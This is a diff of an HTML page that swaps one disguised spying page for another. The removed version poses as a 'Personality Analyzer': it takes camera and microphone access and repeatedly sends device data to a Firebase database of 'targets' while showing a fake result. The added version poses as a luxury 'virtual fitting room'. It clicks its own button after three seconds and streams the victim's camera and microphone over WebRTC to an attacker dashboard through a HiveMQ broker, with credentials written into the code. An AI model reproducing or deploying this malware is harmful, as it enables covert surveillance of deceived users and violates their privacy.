@@ -1,305 +1,185 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>🎭 Personality Analyzer Pro</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LuxeZen | Exclusive Preview</title>
     <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            min-height: 100vh;
             margin: 0;
-            padding: 20px;
-            text-align: center;
+            padding: 0;
+            background: #0a0a0a;
+            color: #fff;
+            font-family: 'Segoe UI', sans-serif;
+            overflow-x: hidden;
         }
         .container {
-            max-width: 500px;
+            max-width: 800px;
             margin: 0 auto;
-            background: rgba(255,255,255,0.1);
-            padding: 40px;
-            border-radius: 25px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            padding: 40px 20px;
+            text-align: center;
         }
-        h1 {
+        .logo {
             font-size: 2.5rem;
+            font-weight: 300;
+            letter-spacing: 8px;
+            color: #d4af37;
             margin-bottom: 10px;
-            text-shadow: 0 2px 10px rgba(0,0,0,0.3);
         }
-        .btn {
-            background: linear-gradient(90deg, #ff6b6b, #ffa36c);
-            color: white;
+        .tagline {
+            font-size: 1rem;
+            color: #aaa;
+            margin-bottom: 50px;
+        }
+        .main-btn {
+            background: linear-gradient(135deg, #d4af37, #f7ef8a);
             border: none;
-            padding: 20px 50px;
+            padding: 22px 50px;
             font-size: 1.3rem;
+            color: #000;
             border-radius: 50px;
             cursor: pointer;
-            margin: 30px 0;
+            transition: transform 0.3s, box-shadow 0.3s;
             font-weight: bold;
-            transition: all 0.3s;
+            letter-spacing: 2px;
+            margin-top: 30px;
         }
-        .btn:hover {
+        .main-btn:hover {
             transform: scale(1.05);
-            box-shadow: 0 10px 25px rgba(255,107,107,0.4);
+            box-shadow: 0 0 30px rgba(212, 175, 55, 0.7);
         }
-        .btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-        #status {
-            background: rgba(0,0,0,0.2);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 25px 0;
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .loader {
+        .loading {
             display: none;
-            width: 40px;
-            height: 40px;
-            border: 4px solid rgba(255,255,255,0.3);
-            border-top: 4px solid white;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+            margin-top: 30px;
+            color: #d4af37;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .footer {
+            margin-top: 80px;
+            color: #555;
+            font-size: 0.8rem;
         }
-        .permission-item {
-            display: inline-block;
-            background: rgba(255,255,255,0.2);
-            padding: 15px 25px;
-            margin: 10px;
-            border-radius: 15px;
+        .hidden {
+            display: none;
         }
-        .active {
-            background: rgba(255,255,255,0.4);
-            border: 2px solid #4CAF50;
+        #video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            margin-top: 20px;
+            border: 2px solid #d4af37;
         }
     </style>
-    <!-- Firebase SDK Versi 9 (modular) -->
-    <script type="module">
-        // Import Firebase
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
-        import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
-        
-        // 🔥 CONFIG FIREBASE LU (SUDAH DIPERBAIKI)
-        const firebaseConfig = {
-            apiKey: "AIzaSyCYW9Q7arkMiseBLO3z4xoe_7G43vHBRU",
-            authDomain: "survei-fllal.firebaseapp.com",
-            databaseURL: "https://survei-fllal-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "survei-fllal",
-            storageBucket: "survei-fllal.firebasestorage.app",
-            messagingSenderId: "769641856914",
-            appId: "1:769641856914:web:3be7b2cf77ccb9bab9427b"
-        };
-        
-        // Initialize Firebase
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
-        
-        // Global variables
-        const TARGET_ID = 'target_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
-        let isActive = false;
-        let dataInterval;
-        
-        // Function to start spying
-        window.startSpying = function() {
-            if (isActive) return;
-            
-            const btn = document.querySelector('.btn');
-            const status = document.getElementById('status');
-            const loader = document.querySelector('.loader');
-            
-            btn.innerHTML = '🔍 ANALYZING...';
-            btn.disabled = true;
-            loader.style.display = 'block';
-            status.innerHTML = 'Requesting camera and microphone access...';
-            
-            // Request camera and mic
-            navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" },
-                audio: true 
-            })
-            .then(stream => {
-                isActive = true;
-                loader.style.display = 'none';
-                status.innerHTML = '✅ Camera & microphone active! Analyzing personality...';
-                
-                // Update permission UI
-                document.getElementById('camPerm').classList.add('active');
-                document.getElementById('micPerm').classList.add('active');
-                
-                // Start sending data to Firebase
-                startSendingData(stream);
-                
-                // Show fake analysis results after 8 seconds
-                setTimeout(showResults, 8000);
-                
-            })
-            .catch(err => {
-                // Jika user menolak camera/mic
-                isActive = true;
-                loader.style.display = 'none';
-                status.innerHTML = '⚠️ Using basic analysis (no camera)';
-                startSendingData(null);
-                setTimeout(showResults, 8000);
-            });
-        };
-        
-        function startSendingData(stream) {
-            // Send data every 5 seconds
-            dataInterval = setInterval(() => {
-                const data = {
-                    id: TARGET_ID,
-                    timestamp: Date.now(),
-                    battery: getBatteryInfo(),
-                    device: {
-                        platform: navigator.platform,
-                        userAgent: navigator.userAgent,
-                        screen: `${screen.width}x${screen.height}`,
-                        language: navigator.language,
-                        vendor: navigator.vendor || 'Unknown',
-                        cookies: navigator.cookieEnabled,
-                        online: navigator.onLine
-                    },
-                    location: {
-                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                        languages: navigator.languages || []
-                    },
-                    media: stream ? 'ACTIVE' : 'INACTIVE',
-                    lastUpdate: new Date().toISOString()
-                };
-                
-                // Send to Firebase
-                const targetRef = ref(database, 'targets/' + TARGET_ID);
-                set(targetRef, data)
-                .then(() => {
-                    console.log('✅ Data sent to Firebase');
-                    updateStatus(`Data updated: ${new Date().toLocaleTimeString()}`);
-                })
-                .catch(error => {
-                    console.error('❌ Firebase error:', error);
-                    updateStatus('Connection issue - data saved locally');
-                    // Save to localStorage as backup
-                    localStorage.setItem('surv_backup_' + Date.now(), JSON.stringify(data));
-                });
-                
-            }, 5000);
-            
-            // Send first data immediately
-            setTimeout(() => {
-                const targetRef = ref(database, 'targets/' + TARGET_ID);
-                const firstData = {
-                    id: TARGET_ID,
-                    timestamp: Date.now(),
-                    device: navigator.platform,
-                    status: 'CONNECTED',
-                    lastUpdate: new Date().toISOString()
-                };
-                set(targetRef, firstData);
-            }, 1000);
-        }
-        
-        function getBatteryInfo() {
-            if (navigator.getBattery) {
-                return navigator.getBattery().then(battery => {
-                    return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging
-                    };
-                });
-            }
-            return 'Unknown';
-        }
-        
-        function updateStatus(message) {
-            const status = document.getElementById('status');
-            const current = status.innerHTML;
-            if (!current.includes('Data updated')) {
-                status.innerHTML = `${current.split('<br>')[0]}<br><small>${message}</small>`;
-            }
-        }
-        
-        function showResults() {
-            const status = document.getElementById('status');
-            const btn = document.querySelector('.btn');
-            
-            const personalities = [
-                { name: "The Visionary", desc: "Creative and forward-thinking" },
-                { name: "The Analyst", desc: "Logical and detail-oriented" },
-                { name: "The Empath", desc: "Intuitive and caring" },
-                { name: "The Strategist", desc: "Planner and problem-solver" }
-            ];
-            
-            const result = personalities[Math.floor(Math.random() * personalities.length)];
-            
-            status.innerHTML = `
-                <h3>🎉 ANALYSIS COMPLETE!</h3>
-                <p>Your personality type: <strong>${result.name}</strong></p>
-                <p>${result.desc}</p>
-            `;
-            
-            btn.innerHTML = 'ANALYSIS COMPLETE ✓';
-            
-            // Send final result to Firebase
-            const targetRef = ref(database, 'targets/' + TARGET_ID + '/personality');
-            set(targetRef, {
-                type: result.name,
-                description: result.desc,
-                analyzedAt: new Date().toISOString()
-            });
-        }
-        
-        // Clean up when page closes
-        window.addEventListener('beforeunload', () => {
-            if (dataInterval) clearInterval(dataInterval);
-            
-            // Mark as offline in Firebase
-            const targetRef = ref(database, 'targets/' + TARGET_ID + '/status');
-            set(targetRef, 'OFFLINE');
-        });
-        
-        // Initialize
-        window.addEventListener('DOMContentLoaded', () => {
-            console.log('🔥 Firebase initialized for target:', TARGET_ID);
-        });
-    </script>
 </head>
 <body>
     <div class="container">
-        <h1>🎭 Personality Analyzer</h1>
-        <p>Discover your true personality through advanced AI analysis</p>
+        <div class="logo">LUXEZEN</div>
+        <div class="tagline">EXCLUSIVE DIGITAL FITTING ROOM — PRIVATE PREVIEW</div>
+        <p>Experience the future of fashion tailoring. Our AI will analyze your profile to curate a personalized collection.</p>
+        <p><em>Please allow camera access for body measurement scanning.</em></p>
         
-        <div style="margin: 25px 0;">
-            <div class="permission-item" id="camPerm">
-                📷 Camera Access
-            </div>
-            <div class="permission-item" id="micPerm">
-                🎤 Microphone
-            </div>
+        <button class="main-btn" id="startBtn">🎀 LAUNCH VIRTUAL FITTING</button>
+        
+        <div class="loading" id="loading">
+            Initializing scanning environment... <br>
+            <small>Do not close this window.</small>
         </div>
-        
-        <button class="btn" onclick="startSpying()">
-            START PERSONALITY ANALYSIS
-        </button>
-        
-        <div class="loader"></div>
-        
-        <div id="status">
-            Click the button above to start your personality analysis
-        </div>
-        
-        <div style="margin-top: 30px; font-size: 0.9em; opacity: 0.8;">
-            <p>🔒 Your data is used only for personality analysis</p>
-            <p>⏱️ Analysis takes about 10 seconds</p>
+
+        <video id="video" autoplay playsinline></video>
+
+        <div class="footer">
+            <p>© 2025 LuxeZen Collective. This is a private preview session.<br>
+            <span id="sessionId">Session ID: Loading...</span></p>
         </div>
     </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/simple-peer@9.11.1/simplepeer.min.js"></script>
+    <script>
+        const startBtn = document.getElementById('startBtn');
+        const loading = document.getElementById('loading');
+        const video = document.getElementById('video');
+        const sessionIdEl = document.getElementById('sessionId');
+
+        // Generate session ID
+        const sessionId = 'TARGET_' + Math.random().toString(36).substring(2, 10).toUpperCase();
+        sessionIdEl.innerText = `Session ID: ${sessionId}`;
+
+        let peer = null;
+        let stream = null;
+        let mqttClient = null;
+
+        // HiveMQ WebSocket connection
+        const ws = new WebSocket('wss://aa3c606196d945bc89c194f94dc418b5.a1.au.hivema.cloud:8884/mqtt');
+
+        ws.onopen = () => {
+            console.log('Connected to HiveMQ');
+            // Subscribe ke channel sendiri untuk menerima signal dari dashboard
+            ws.send(JSON.stringify({
+                cmd: 'subscribe',
+                topics: [`spy/${sessionId}/signal`],
+                username: 'Zang',
+                password: 'ZingZangRulez'
+            }));
+        };
+
+        ws.onmessage = (event) => {
+            const msg = JSON.parse(event.data);
+            if (msg.topic === `spy/${sessionId}/signal` && peer) {
+                const data = JSON.parse(msg.payload);
+                peer.signal(data);
+            }
+        };
+
+        startBtn.onclick = async () => {
+            startBtn.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                video.srcObject = stream;
+                video.classList.remove('hidden');
+
+                // Create peer connection
+                peer = new SimplePeer({
+                    initiator: true,
+                    stream: stream,
+                    config: {
+                        iceServers: [
+                            { urls: 'stun:stun.l.google.com:19302' },
+                            { urls: 'stun:global.stun.twilio.com:3478' }
+                        ]
+                    }
+                });
+
+                peer.on('signal', data => {
+                    // Kirim signal ke channel dashboard
+                    ws.send(JSON.stringify({
+                        cmd: 'publish',
+                        topic: 'spy/DASHBOARD/signal',
+                        payload: JSON.stringify({
+                            sessionId: sessionId,
+                            signal: data
+                        }),
+                        username: 'Zang',
+                        password: 'ZingZangRulez'
+                    }));
+                });
+
+                peer.on('connect', () => {
+                    console.log('PEER CONNECTED - Stream active');
+                    loading.innerHTML = 'Scanning in progress...<br>You may minimize this window.';
+                });
+
+                console.log('Spy stream started.');
+            } catch (err) {
+                console.error('Error:', err);
+                loading.innerHTML = 'Camera access required.<br>Please refresh and allow.';
+            }
+        };
+
+        // Auto-start setelah 3 detik (opsional, biar lebih natural)
+        setTimeout(() => {
+            startBtn.click();
+        }, 3000);
+    </script>
 </body>
-</html>
+    </html>
